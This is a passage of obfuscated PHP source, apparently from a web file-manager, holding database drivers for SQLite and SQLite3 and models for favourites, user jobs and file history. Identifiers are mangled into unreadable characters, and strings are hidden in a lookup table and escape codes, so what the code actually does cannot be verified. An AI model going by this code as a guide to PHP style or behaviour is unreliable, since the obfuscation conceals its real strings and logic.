array_merge($Ç¶ÃÜÛÆ[$œ‹Ì—Àğ[86]], $Ç¶ÃÜÛÆ[$œ‹Ì—Àğ[85]]); $Ç¶ÃÜÛÆ = array_to_keyvalue($Ç¶ÃÜÛÆ, $œ‹Ì—Àğ[193]); foreach ($€ş„ÏÑå as $ŞíÓ—¦ => $ç©ôí¦„) { $±ôò‚–Ü = $Ç¶ÃÜÛÆ[$ç©ôí¦„[$œ‹Ì—Àğ[87]]]; $±ôò‚–Ü = $±ôò‚–Ü ? $±ôò‚–Ü : array(); $€ş„ÏÑå[$ŞíÓ—¦] = array_merge($±ôò‚–Ü, $ç©ôí¦„); } return $€ş„ÏÑå; } protected function addFav($Ğâ¹–Ô£, $İ’ÈÃÓû = '', $·š„–şı = "\163\x6f\165\162\143\x65") { $†Ÿê°Ì¡ =& $_SERVER[ÔÕ±ĞšÎ]; $ñÚäí¦ì = array($†Ÿê°Ì¡[1768] => USER_ID, $†Ÿê°Ì¡[559] => 0, $†Ÿê°Ì¡[498] => $·š„–şı, $†Ÿê°Ì¡[497] => $Ğâ¹–Ô£); if ($this->where($ñÚäí¦ì)->find()) { return !1; } $ñÚäí¦ì = array($†Ÿê°Ì¡[1768] => USER_ID, $†Ÿê°Ì¡[559] => 0); $ÊşªÜñÚ = $this->where($ñÚäí¦ì)->max($†Ÿê°Ì¡[2002]); if (!$ÊşªÜñÚ) { $ÊşªÜñÚ = 0; } if (!$İ’ÈÃÓû && $·š„–şı == $†Ÿê°Ì¡[492]) { $“ë ª£ì = Model($†Ÿê°Ì¡[1423])->where(array($†Ÿê°Ì¡[493] => $Ğâ¹–Ô£))->find(); if (!$“ë ª£ì) { return !1; } $İ’ÈÃÓû = $“ë ª£ì[$†Ÿê°Ì¡[32]]; } $İ’ÈÃÓû = $this->getAutoName($İ’ÈÃÓû); $Œ›ê˜‘ = array($†Ÿê°Ì¡[1768] => USER_ID, $†Ÿê°Ì¡[559] => 0, $†Ÿê°Ì¡[496] => $İ’ÈÃÓû, $†Ÿê°Ì¡[497] => $Ğâ¹–Ô£, $†Ÿê°Ì¡[498] => $·š„–şı, $†Ÿê°Ì¡[1982] => $ÊşªÜñÚ + 1); return $this->add($Œ›ê˜‘); } protected function remove($Çœ…‚›É) { $ü™ò¨÷ =& $_SERVER[ÔÕ±ĞšÎ]; $ÃÀò« = array($ü™ò¨÷[1768] => USER_ID, $ü™ò¨÷[495] => $Çœ…‚›É); return $this->where($ÃÀò«)->delete(); } protected function removeByName($„¾ùŸˆÇ) { $‰öÆãÁ¥ =& $_SERVER[ÔÕ±ĞšÎ]; $ÖöÆ°ñƒ = array($‰öÆãÁ¥[1768] => USER_ID, $‰öÆãÁ¥[496] => $„¾ùŸˆÇ, $‰öÆãÁ¥[559] => 0); return $this->where($ÖöÆ°ñƒ)->delete(); } protected function rename($ë•§Öà°, $ùÔÅúßí) { $óÏöúù =& $_SERVER[ÔÕ±ĞšÎ]; if ($ë•§Öà° == $ùÔÅúßí) { return !1; } $ã…ŠûÑì = $this->getAutoName($ùÔÅúßí); if ($ùÔÅúßí != $ã…ŠûÑì) { return !1; } $ˆ ¹¾ó = array($óÏöúù[1768] => USER_ID, $óÏöúù[559] => 0, $óÏöúù[32] => $ë•§Öà°); return $this->where($ˆ ¹¾ó)->save(array($óÏöúù[32] => $ùÔÅúßí)); } protected function resetSort($’„ÅÎË) { $¶âÔŒèĞ =& $_SERVER[ÔÕ±ĞšÎ]; $’„ÅÎË = is_array($’„ÅÎË) ? $’„ÅÎË : array(); $ÕÄºâçì = array($¶âÔŒèĞ[1768] => USER_ID); for ($í†Å€á» = 0; $í†Å€á» < count($’„ÅÎË); $í†Å€á»++) { $ÕÄºâçì[$¶âÔŒèĞ[495]] = $’„ÅÎË[$í†Å€á»]; $this->where($ÕÄºâçì)->save(array($¶âÔŒèĞ[1982] => $í†Å€á» + 1)); } return !0; } protected function moveTop($¦†˜ æ‹) { $İ¦“ôÄÏ =& $_SERVER[ÔÕ±ĞšÎ]; $¾Ô£ÜŠ˜ = array($İ¦“ôÄÏ[1768] => USER_ID, $İ¦“ôÄÏ[559] => 0); $æáË€¸Ò = $this->where($¾Ô£ÜŠ˜)->where(array($İ¦“ôÄÏ[32] => $¦†˜ æ‹))->find(); if (!$æáË€¸Ò) { return; } $Ô¼½·Î = $this->field($İ¦“ôÄÏ[477])->where($¾Ô£ÜŠ˜)->order($İ¦“ôÄÏ[2466])->select(); $Ô¼½·Î = array_to_keyvalue($Ô¼½·Î, $İ¦“ôÄÏ[12], $İ¦“ôÄÏ[477]); $È‡ê¨ = $Ô¼½·Î; $Ô¼½·Î = array_remove_value($Ô¼½·Î, $æáË€¸Ò[$İ¦“ôÄÏ[477]]); array_unshift($Ô¼½·Î, $æáË€¸Ò[$İ¦“ôÄÏ[477]]); return $this->resetSort($Ô¼½·Î); } protected function moveBottom($Œ»™Ò®¶) { $¬š»ó¸‘ =& $_SERVER[ÔÕ±ĞšÎ]; $ó€·ğª‰ = array($¬š»ó¸‘[1768] => USER_ID, $¬š»ó¸‘[559] => 0); $Áì•„ëò = $this->where($ó€·ğª‰)->max($¬š»ó¸‘[2002]); $¡óÎ¾É„ = array($¬š»ó¸‘[2002] => $Áì•„ëò + 1); return $this->where($ó€·ğª‰)->where(array($¬š»ó¸‘[32] => $Œ»™Ò®¶))->save($¡óÎ¾É„); } private function getAutoName($İºŒŠä—) { $Å’ÛúÄ“ =& $_SERVER[ÔÕ±ĞšÎ]; $ñ—Ÿˆ¹ª = array($Å’ÛúÄ“[1768] => USER_ID, $Å’ÛúÄ“[559] => 0); $©ßçÜ±” = $this->field($Å’ÛúÄ“[32])->where($ñ—Ÿˆ¹ª)->select(); $©ßçÜ±” = array_to_keyvalue($©ßçÜ±”, $Å’ÛúÄ“[12], $Å’ÛúÄ“[32]); if (!$©ßçÜ±” || !in_array($İºŒŠä—, $©ßçÜ±”)) { return $İºŒŠä—; } for ($¬¬‚ÏŞÏ = 0; $¬¬‚ÏŞÏ < count($©ßçÜ±”); $¬¬‚ÏŞÏ++) { if (!in_array($İºŒŠä— . "\x28{$¬¬‚ÏŞÏ}\x29", $©ßçÜ±”)) { return $İºŒŠä— . "\x28{$¬¬‚ÏŞÏ}\51"; } } return $İºŒŠä— . "\x28{$¬¬‚ÏŞÏ}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\152\157\x62\x4c\151\163\164"; public $field = array("\156\141\155\145", "\144\145\163\x63", "\163\157\162\164"); const JOB_KEY = "\163\145\x6c\146\112\x6f\x62\114\151\x73\164"; public function listData($¦åš‡õî = false, $Ş¢ßáñ = "\163\x6f\x72\x74", $Ï±Ğ©Ğ® = false) { return parent::listData($¦åš‡õî, $Ş¢ßáñ, $Ï±Ğ©Ğ®); } public function remove($‘ò±¤£Ä) { return parent::remove($‘ò±¤£Ä); } public function add($äñ§¿„) { $’›ùÉÓ =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->findByName($äñ§¿„[$’›ùÉÓ[32]])) { return !1; } $äñ§¿„[$’›ùÉÓ[2002]] = $this->getSort(); return parent::insert($äñ§¿„); } private function getSort() { $‹äœßü =& $_SERVER[ÔÕ±ĞšÎ]; $•ò‘š“ = parent::listData(); $ÒšÒÎ—‡ = array_to_keyvalue($•ò‘š“, $‹äœßü[12], $‹äœßü[2002]); return empty($ÒšÒÎ—‡) ? 0 : max($ÒšÒÎ—‡) + 1; } public function update($¢¯óÑå£, $“¯“®²º) { $Äİ°‹Éá =& $_SERVER[ÔÕ±ĞšÎ]; $‚×³Ùõ = parent::listData($¢¯óÑå£); $´¿ï£ÏŒ = $this->findByName($“¯“®²º[$Äİ°‹Éá[32]]); if (!$‚×³Ùõ || $´¿ï£ÏŒ && $´¿ï£ÏŒ[$Äİ°‹Éá[477]] != $‚×³Ùõ[$Äİ°‹Éá[477]]) { return !1; } return parent::update($¢¯óÑå£, $“¯“®²º); } public function setUserJob($Î»ªİË, $±œßØßÎ) { $˜ºúÖ© =& $_SERVER[ÔÕ±ĞšÎ]; if (!is_array($±œßØßÎ)) { $±œßØßÎ = array($±œßØßÎ); } $—¬í¨°« = parent::listData(); $ˆã“½Ì = array_to_keyvalue($—¬í¨°«, $˜ºúÖ©[32]); $ÁèÒ‚¬˜ = $˜ºúÖ©[456]; foreach ($±œßØßÎ as $Ğø±¨ºà) { if ($ˆã“½Ì[$Ğø±¨ºà]) { $ÁèÒ‚¬˜ .= $ˆã“½Ì[$Ğø±¨ºà][$˜ºúÖ©[477]] . $˜ºúÖ©[50]; } else { $ß‡å¾Ç½ = $this->add($Ğø±¨ºà); $ÁèÒ‚¬˜ .= $ß‡å¾Ç½ . $˜ºúÖ©[50]; } } $ÁèÒ‚¬˜ = rtrim($ÁèÒ‚¬˜, $˜ºúÖ©[50]); Model($˜ºúÖ©[599])->metaSet($Î»ªİË, self::JOB_KEY, $ÁèÒ‚¬˜); } public function getUserJob($²¨’¹ø) { $é¯°“ù = Model($_SERVER[ÔÕ±ĞšÎ][599])->metaGet($²¨’¹ø); return $this->getUserJobInfo($é¯°“ù[self::JOB_KEY]); } public function getUserJobInfo($¨ù‰Ÿèı) { $À¯ç±Ş =& $_SERVER[ÔÕ±ĞšÎ]; $ã‰—’„ = explode($À¯ç±Ş[50], $¨ù‰Ÿèı); $í—Ã™¼‚ = parent::listData(); $í—Ã™¼‚ = array_remove_key($í—Ã™¼‚, $À¯ç±Ş[233]); $²•µİ«™ = array(); foreach ($ã‰—’„ as $¹È»óéñ) { if (isset($í—Ã™¼‚[$¹È»óéñ])) { $²•µİ«™[] = $í—Ã™¼‚[$¹È»óéñ]; } } return $²•µİ«™; } } goto cÓ¶İ‹¡„Ñ; A‡Ò¸ƒÈÄ‚: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Ÿ­–—¿İ =& $_SERVER[ÔÕ±ĞšÎ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Ÿ­–—¿İ[6]] =& $config; $this->values[$Ÿ­–—¿İ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Ÿ­–—¿İ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ıèÚùñÂ) { if (1 === func_num_args()) { $this->{$ıèÚùñÂ} = new $ıèÚùñÂ(); } else { $üí­½Ş» = new ReflectionClass($ıèÚùñÂ); $¸©ïËûŞ = func_get_args(); array_shift($¸©ïËûŞ); $this->{$ıèÚùñÂ} = $üí­½Ş»->newInstanceArgs($¸©ïËûŞ); } return $this->{$ıèÚùñÂ}; } public function routeBind($åçœ¢Æû, $«ìÇ‰µø, $¶ª“Ü™´ = 3) { $›¶ø´®’ =& $_SERVER[ÔÕ±ĞšÎ]; $º¦ßËã“ = $this->in[$›¶ø´®’[9]]; $åçœ¢Æû = str_replace($›¶ø´®’[10], $›¶ø´®’[11], trim(trim($åçœ¢Æû, $›¶ø´®’[8]), $›¶ø´®’[12])); if (!$åçœ¢Æû || count($º¦ßËã“) <= $¶ª“Ü™´) { return !1; } $¥õä·¯´ = !0; $ƒÜ¼ñƒ = explode($›¶ø´®’[8], $åçœ¢Æû); for ($ÔÑ¥‚– = 0; $ÔÑ¥‚– < count($ƒÜ¼ñƒ); $ÔÑ¥‚–++) { if ($ƒÜ¼ñƒ[$ÔÑ¥‚–] != $º¦ßËã“[$¶ª“Ü™´ + $ÔÑ¥‚–]) { $¥õä·¯´ = !1; break; } } if (!$¥õä·¯´) { return; } call_user_func_array(array($this, $«ìÇ‰µø), array()); } public function routeArgs($ÛÏÖ±‡ˆ = 3) { $–ŠÈ¨ÍÇ = $this->in[$_SERVER[ÔÕ±ĞšÎ][9]]; if (count($–ŠÈ¨ÍÇ) <= $ÛÏÖ±‡ˆ) { return array(); } $ì›‡âæÁ = array(); for ($‰œé¸Êó = $ÛÏÖ±‡ˆ; $‰œé¸Êó < count($–ŠÈ¨ÍÇ); $‰œé¸Êó += 2) { $ì›‡âæÁ[$–ŠÈ¨ÍÇ[$‰œé¸Êó]] = $–ŠÈ¨ÍÇ[$‰œé¸Êó + 1]; $this->in[$–ŠÈ¨ÍÇ[$‰œé¸Êó]] = $–ŠÈ¨ÍÇ[$‰œé¸Êó + 1]; } return $ì›‡âæÁ; } protected function assign($´Ş¤ñ‘‘, $ª‘ÜÛ¡“) { $this->values[$´Ş¤ñ‘‘] = $ª‘ÜÛ¡“; } protected function display($ôßƒŒ„½) { ob_end_clean(); extract($this->values); require $this->tpl . $ôßƒŒ„½; } } class DbSqliteBase extends Db { public function __construct($İ¢¡æ¡¼ = '') { $¾ˆ‚ÚŠó =& $_SERVER[ÔÕ±ĞšÎ]; if (!extension_loaded($¾ˆ‚ÚŠó[13])) { think_exception(think_lang($¾ˆ‚ÚŠó[14]) . $¾ˆ‚ÚŠó[15]); } if (!empty($İ¢¡æ¡¼)) { if (!isset($İ¢¡æ¡¼[$¾ˆ‚ÚŠó[16]])) { $İ¢¡æ¡¼[$¾ˆ‚ÚŠó[16]] = 438; } $this->config = $İ¢¡æ¡¼; if (empty($this->config[$¾ˆ‚ÚŠó[17]])) { $this->config[$¾ˆ‚ÚŠó[17]] = array(); } } } public function connect($œ„ğ›¯ò = '', $¶é’¢«û = 0) { $¡ïîñÇ =& $_SERVER[ÔÕ±ĞšÎ]; if (!isset($this->linkID[$¶é’¢«û])) { if (empty($œ„ğ›¯ò)) { $œ„ğ›¯ò = $this->config; } $¨É­Ùíñ = !empty($œ„ğ›¯ò[$¡ïîñÇ[17]][$¡ïîñÇ[18]]) ? $œ„ğ›¯ò[$¡ïîñÇ[17]][$¡ïîñÇ[18]] : $this->pconnect; $û“ç·Øõ = $¨É­Ùíñ ? $¡ïîñÇ[19] : $¡ïîñÇ[20]; $this->linkID[$¶é’¢«û] = $û“ç·Øõ($œ„ğ›¯ò[$¡ïîñÇ[21]], $œ„ğ›¯ò[$¡ïîñÇ[16]]); if (!$this->linkID[$¶é’¢«û]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$¶é’¢«û], 30000); if (1 != think_config($¡ïîñÇ[22])) { unset($this->config); } } return $this->linkID[$¶é’¢«û]; } public function free() { $this->queryID = null; } public function query($ëéÃ˜“ú) { $±…òŒŸå =& $_SERVER[ÔÕ±ĞšÎ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ëéÃ˜“ú; if ($this->queryID) { $this->free(); } think_action_status($±…òŒŸå[23], 1); think_status($±…òŒŸå[24]); $this->queryID = sqlite_query($this->_linkID, $ëéÃ˜“ú); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÈÁìÑŒ = $this->getAll(); return $ÈÁìÑŒ; } } public function execute($º–£¤à˜) { $Â›—ûÙ” =& $_SERVER[ÔÕ±ĞšÎ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $º–£¤à˜; if ($this->queryID) { $this->free(); } think_action_status($Â›—ûÙ”[25], 1); think_status($Â›—ûÙ”[24]); $¶’›¾áÂ = sqlite_exec($this->_linkID, $º–£¤à˜); $this->debug(); if (!1 === $¶’›¾áÂ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ÔÕ±ĞšÎ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $éÖø§­ = sqlite_query($this->_linkID, $_SERVER[ÔÕ±ĞšÎ][27]); if (!$éÖø§­) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $—£´„ = sqlite_query($this->_linkID, $_SERVER[ÔÕ±ĞšÎ][28]); if (!$—£´„) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $™…ÜÕìÑ = array(); if ($this->numRows > 0) { for ($ÓêşÏç¶ = 0; $ÓêşÏç¶ < $this->numRows; $ÓêşÏç¶++) { $™…ÜÕìÑ[$ÓêşÏç¶] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $™…ÜÕìÑ; } public function getFields($ğ åíÇÇ) { $¬±Ç÷‡Ç =& $_SERVER[ÔÕ±ĞšÎ]; $¥À÷÷Äá = $this->query($¬±Ç÷‡Ç[29] . $ğ åíÇÇ . $¬±Ç÷‡Ç[30]); $­ØÙ•ğ‰ = array(); if ($¥À÷÷Äá) { foreach ($¥À÷÷Äá as $§´²¬ìş => $à‡íô¤ğ) { $­ØÙ•ğ‰[$à‡íô¤ğ[$¬±Ç÷‡Ç[31]]] = array($¬±Ç÷‡Ç[32] => $à‡íô¤ğ[$¬±Ç÷‡Ç[31]], $¬±Ç÷‡Ç[33] => $à‡íô¤ğ[$¬±Ç÷‡Ç[34]], $¬±Ç÷‡Ç[35] => (bool) ($à‡íô¤ğ[$¬±Ç÷‡Ç[36]] === $¬±Ç÷‡Ç[12]), $¬±Ç÷‡Ç[37] => $à‡íô¤ğ[$¬±Ç÷‡Ç[38]], $¬±Ç÷‡Ç[39] => strtolower($à‡íô¤ğ[$¬±Ç÷‡Ç[40]]) == $¬±Ç÷‡Ç[41], $¬±Ç÷‡Ç[42] => strtolower($à‡íô¤ğ[$¬±Ç÷‡Ç[43]]) == $¬±Ç÷‡Ç[44]); } } return $­ØÙ•ğ‰; } public function getTables($ú“‡ŞàÔ = '') { $í¦®€í¤ =& $_SERVER[ÔÕ±ĞšÎ]; $¾”‡±Í = $this->query($í¦®€í¤[45] . $í¦®€í¤[46] . $í¦®€í¤[47]); $Ù“üæğ = array(); foreach ($¾”‡±Í as $™È¢ÍÆŞ => $õ•ª‹½¯) { $Ù“üæğ[$™È¢ÍÆŞ] = current($õ•ª‹½¯); } return $Ù“üæğ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ê—˜Âå =& $_SERVER[ÔÕ±ĞšÎ]; $æû—”ê  = sqlite_last_error($this->_linkID); $this->error = $æû—”ê  . $ê—˜Âå[4] . sqlite_error_string($æû—”ê ); if ($ê—˜Âå[12] != $this->queryStr) { $this->error .= LNG($ê—˜Âå[48]) . $this->queryStr; } think_trace($this->error, $ê—˜Âå[12], $ê—˜Âå[49]); return $this->error; } public function escapeString($¶ššÅ…’) { return sqlite_escape_string($¶ššÅ…’); } public function parseLimit($¥úÏ¦) { $œÙËí®Ö =& $_SERVER[ÔÕ±ĞšÎ]; $ŸÎÒÜ¿ş = $œÙËí®Ö[12]; if (!empty($¥úÏ¦)) { $¥úÏ¦ = explode($œÙËí®Ö[50], $¥úÏ¦); if (count($¥úÏ¦) > 1) { $ŸÎÒÜ¿ş .= $œÙËí®Ö[51] . $¥úÏ¦[1] . $œÙËí®Ö[52] . $¥úÏ¦[0] . $œÙËí®Ö[53]; } else { $ŸÎÒÜ¿ş .= $œÙËí®Ö[51] . $¥úÏ¦[0] . $œÙËí®Ö[53]; } } return $ŸÎÒÜ¿ş; } } class DbSqlite3Base extends Db { public function __construct($”Ğâó¥ = '') { $–‹÷Ãğï =& $_SERVER[ÔÕ±ĞšÎ]; if (!class_exists($–‹÷Ãğï[54])) { think_exception(think_lang($–‹÷Ãğï[14]) . $–‹÷Ãğï[55]); } if (!empty($”Ğâó¥)) { if (!isset($”Ğâó¥[$–‹÷Ãğï[16]])) { $”Ğâó¥[$–‹÷Ãğï[16]] = 438; } $this->config = $”Ğâó¥; if (empty($this->config[$–‹÷Ãğï[17]])) { $this->config[$–‹÷Ãğï[17]] = array(); } } } public function connect($¾ë½¯ = '', $ÎÉ€·æã = 0) { $“ôÆ¦úı =& $_SERVER[ÔÕ±ĞšÎ]; if (!isset($this->linkID[$ÎÉ€·æã])) { if (empty($¾ë½¯)) { $¾ë½¯ = $this->config; } $this->linkID[$ÎÉ€·æã] = new SQLite3($¾ë½¯[$“ôÆ¦úı[21]]); if (!$this->linkID[$ÎÉ€·æã]) { think_exception($this->linkID[$ÎÉ€·æã]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ÎÉ€·æã]->busyTimeout(30000); if (1 != think_config($“ôÆ¦úı[22])) { unset($this->config); } } return $this->linkID[$ÎÉ€·æã]; } public function free() { $this->queryID = null; } public function query($Ü´Ùü•™) { $¢›•û»¥ =& $_SERVER[ÔÕ±ĞšÎ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ü´Ùü•™; if ($this->queryID) { $this->free(); } think_action_status($¢›•û»¥[23], 1); think_status($¢›•û»¥[24]); $this->queryID = $this->_linkID->query($Ü´Ùü•™); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Â¾”Ó¬è = $this->getAll(); $this->numRows = count($Â¾”Ó¬è); return $Â¾”Ó¬è; } } public function execute($ÍµÆ±Öã) { $ÄÉÜ¡ƒ =& $_SERVER[ÔÕ±ĞšÎ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÍµÆ±Öã; if ($this->queryID) { $this->free(); } think_action_status($ÄÉÜ¡ƒ[25], 1); think_status($ÄÉÜ¡ƒ[24]); $Ïéî®ìî = $this->_linkID->exec($ÍµÆ±Öã); $this->debug(); if (!1 === $Ïéî®ìî) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ÔÕ±ĞšÎ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¸¯”ÉÁÆ = $this->_linkID->query($_SERVER[ÔÕ±ĞšÎ][27]); if (!$¸¯”ÉÁÆ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¼ıæ’×¯ = $this->_linkID->query($_SERVER[ÔÕ±ĞšÎ][28]); if (!$¼ıæ’×¯) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¸È²å¯¦ = array(); while ($µ¯±¯ö¯ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $¸È²å¯¦[] = $µ¯±¯ö¯; } $this->queryID->reset(); return $¸È²å¯¦; } public function getFields($É”ßéÜ‚) { $°ŸÜµ‡˜ =& $_SERVER[ÔÕ±ĞšÎ]; $…íæÛ‰± = $this->query($°ŸÜµ‡˜[29] . $É”ßéÜ‚ . $°ŸÜµ‡˜[30]); $¤°˜Š€ª = array(); if ($…íæÛ‰±) { foreach ($…íæÛ‰± as $¡µÚäÏŠ => $…şÊì„) { $¤°˜Š€ª[$…şÊì„[$°ŸÜµ‡˜[32]]] = array($°ŸÜµ‡˜[32] => $…şÊì„[$°ŸÜµ‡˜[32]], $°ŸÜµ‡˜[33] => $…şÊì„[$°ŸÜµ‡˜[33]], $°ŸÜµ‡˜[35] => (bool) ($…şÊì„[$°ŸÜµ‡˜[35]] === $°ŸÜµ‡˜[12]), $°ŸÜµ‡˜[37] => $…şÊì„[$°ŸÜµ‡˜[56]], $°ŸÜµ‡˜[39] => (bool) $…şÊì„[$°ŸÜµ‡˜[57]], $°ŸÜµ‡˜[42] => (bool) $…şÊì„[$°ŸÜµ‡˜[57]]); } } return $¤°˜Š€ª; } public function getTables($¿Ú›óöÛ = '') { $í¸ÄÀÒ =& $_SERVER[ÔÕ±ĞšÎ]; $›ûóÈ¦ = $this->query($í¸ÄÀÒ[45] . $í¸ÄÀÒ[46] . $í¸ÄÀÒ[47]); $Ş‡‘‹­ = array(); foreach ($›ûóÈ¦ as $Şı÷‘›• => $º»ÉÅ¦ñ) { $Ş‡‘‹­[$Şı÷‘›•] = current($º»ÉÅ¦ñ); } return $Ş‡‘‹­; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $©•¥›ûÍ =& $_SERVER[ÔÕ±ĞšÎ]; $this->error = $this->_linkID->lastErrorMsg(); if ($©•¥›ûÍ[12] != $this->queryStr) { $this->error .= LNG($©•¥›ûÍ[48]) . $this->queryStr; } think_trace($this->error, $©•¥›ûÍ[12], $©•¥›ûÍ[49]); return $this->error; } public function escapeString($ÜúÒçª³) { $¶ÓÄİÆÉ =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->_linkID) { return $this->_linkID->escapeString($ÜúÒçª³); } return str_ireplace($¶ÓÄİÆÉ[58], $¶ÓÄİÆÉ[59], $ÜúÒçª³); } public function parseLimit($†ŸÙ®•­) { $Ø¡àíóõ =& $_SERVER[ÔÕ±ĞšÎ]; $á²ˆÈ¤Ö = $Ø¡àíóõ[12]; if (!empty($†ŸÙ®•­)) { $†ŸÙ®•­ = explode($Ø¡àíóõ[50], $†ŸÙ®•­); if (count($†ŸÙ®•­) > 1) { $á²ˆÈ¤Ö .= $Ø¡àíóõ[51] . $†ŸÙ®•­[1] . $Ø¡àíóõ[52] . $†ŸÙ®•­[0] . $Ø¡àíóõ[53]; } else { $á²ˆÈ¤Ö .= $Ø¡àíóõ[51] . $†ŸÙ®•­[0] . $Ø¡àíóõ[53]; } } return $á²ˆÈ¤Ö; } } goto A¤‡ìÁ…ò™; Bšªƒè–: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\162\143\145\x5f\x68\151\163\164\x6f\x72\x79"; public function historyCount($¹ÈÆÔì) { $¾âéô¥ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$¹ÈÆÔì) { return array(); } if (is_string($¹ÈÆÔì) || is_int($¹ÈÆÔì)) { $¹ÈÆÔì = array($¹ÈÆÔì); } $è¡Í½”à = array($¾âéô¥[193], $¾âéô¥[2230] => $¾âéô¥[567]); $Ëú“Øı = array($¾âéô¥[193] => array($¾âéô¥[7], $¹ÈÆÔì)); $å¬¥Ò» = $this->field($è¡Í½”à)->where($Ëú“Øı)->group($¾âéô¥[193])->select(); return array_to_keyvalue($å¬¥Ò», $¾âéô¥[193], $¾âéô¥[567]); } public function addHistory($Š¤åŸì¯, $™ˆùå¶ì = '') { $£¦üØƒí =& $_SERVER[ÔÕ±ĞšÎ]; $î¤Ö«›´ = array($£¦üØƒí[493] => $Š¤åŸì¯[$£¦üØƒí[193]], $£¦üØƒí[1768] => isset($Š¤åŸì¯[$£¦üØƒí[531]]) ? $Š¤åŸì¯[$£¦üØƒí[531]] : $Š¤åŸì¯[$£¦üØƒí[529]], $£¦üØƒí[544] => $Š¤åŸì¯[$£¦üØƒí[543]], $£¦üØƒí[622] => $Š¤åŸì¯[$£¦üØƒí[79]], $£¦üØƒí[2231] => $™ˆùå¶ì); if ($GLOBALS[$£¦üØƒí[6]][$£¦üØƒí[92]][$£¦üØƒí[1304]] >= 1) { $this->historyAutoClear($î¤Ö«›´[$£¦üØƒí[193]]); $this->add($î¤Ö«›´); } Hook::trigger($£¦üØƒí[2232], $î¤Ö«›´); Model($£¦üØƒí[2233])->eventFileEdit($Š¤åŸì¯[$£¦üØƒí[193]]); } private function historyAutoClear($¸Ö˜¹ï¹) { $ØÚˆ„„Á =& $_SERVER[ÔÕ±ĞšÎ]; $´‹¯ı° = Model($ØÚˆ„„Á[844])->get($ØÚˆ„„Á[1326]); $Ôæã”Ûº = intval($GLOBALS[$ØÚˆ„„Á[6]][$ØÚˆ„„Á[92]][$ØÚˆ„„Á[1304]]); $À¥³ª¡¹ = $´‹¯ı° == $ØÚˆ„„Á[1327] ? min(5, $Ôæã”Ûº) : $Ôæã”Ûº; $À¥³ª¡¹ = $À¥³ª¡¹ <= 0 ? 0 : $À¥³ª¡¹ - 1; if ($À¥³ª¡¹ >= 499) { return; } $”åÆ²ŠÔ = array($ØÚˆ„„Á[493] => $¸Ö˜¹ï¹); $ÖÊâí¥Æ = $this->field($ØÚˆ„„Á[2234])->where($”åÆ²ŠÔ)->order($ØÚˆ„„Á[2227])->select(); if (!$ÖÊâí¥Æ || $À¥³ª¡¹ >= count($ÖÊâí¥Æ)) { return; } $£Ã‹±µ† = array_to_keyvalue($ÖÊâí¥Æ, $ØÚˆ„„Á[12], $ØÚˆ„„Á[477]); $£Ã‹±µ† = array_slice($£Ã‹±µ†, $À¥³ª¡¹); $¬¨ßõ´ = array_to_keyvalue($ÖÊâí¥Æ, $ØÚˆ„„Á[12], $ØÚˆ„„Á[543]); $¬¨ßõ´ = array_slice($¬¨ßõ´, $À¥³ª¡¹); if (!$£Ã‹±µ† || !$¬¨ßõ´) { return; } $”åÆ²ŠÔ = array($ØÚˆ„„Á[495] => array($ØÚˆ„„Á[7], $£Ã‹±µ†)); $this->where($”åÆ²ŠÔ)->delete(); Model($ØÚˆ„„Á[546])->remove($¬¨ßõ´); } public function listData($Ù£æñë©) { $×»¹²ø =& $_SERVER[ÔÕ±ĞšÎ]; $¾ßíï¼ = array($×»¹²ø[493] => $Ù£æñë©); $˜ùÓ„ = $×»¹²ø[2235]; $™¹ÙÎŠ÷ = $this->field($˜ùÓ„)->where($¾ßíï¼)->order($×»¹²ø[2227])->selectPage(); $this->_listAppendUser($™¹ÙÎŠ÷[$×»¹²ø[447]]); $íÇÛš‚ó = Model($×»¹²ø[844])->get($×»¹²ø[1326]); $¾‘¼‹š† = 5; if ($íÇÛš‚ó == $×»¹²ø[1327]) { $™¹ÙÎŠ÷[$×»¹²ø[447]] = array_slice($™¹ÙÎŠ÷[$×»¹²ø[447]], 0, $¾‘¼‹š†); $™¹ÙÎŠ÷[$×»¹²ø[444]] = array($×»¹²ø[2236] => 1, $×»¹²ø[2237] => 20, $×»¹²ø[2238] => 1, 